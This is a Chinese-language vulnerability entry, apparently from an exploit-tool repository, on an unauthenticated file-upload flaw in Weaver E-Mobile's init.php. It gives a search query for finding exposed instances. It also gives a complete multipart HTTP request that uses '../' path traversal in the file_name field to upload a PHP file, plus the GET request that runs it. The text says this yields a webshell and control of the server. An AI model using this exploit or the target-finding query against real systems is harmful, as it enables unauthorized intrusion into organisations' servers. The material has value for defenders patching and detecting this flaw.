---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Mobile App init.php 文件上传漏洞

## 漏洞描述

泛微 E-Mobile 的 `/E-mobile/App/init.php` 接口存在任意文件上传漏洞。通过指定 `m=createDo_Email` 参数调用邮件附件上传功能，`file_name` 参数可控且存在路径遍历，攻击者无需登录即可上传任意文件到 `/attachment/` 目录，直接获取 Webshell。

## 漏洞影响

```
泛微 E-Mobile
```

## 网络测绘

```
app="泛微-EMobile"
```

## 漏洞复现

```http
POST /E-mobile/App/init.php?m=createDo_Email HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file_name"
../testa123.php
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="testa123.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundary--
```

`file_name` 参数使用 `../` 遍历到 `/attachment/` 目录，上传成功后直接访问：

```
GET /attachment/testa123.php HTTP/1.1
```

即可执行上传的 PHP 文件，获取服务器控制权限。
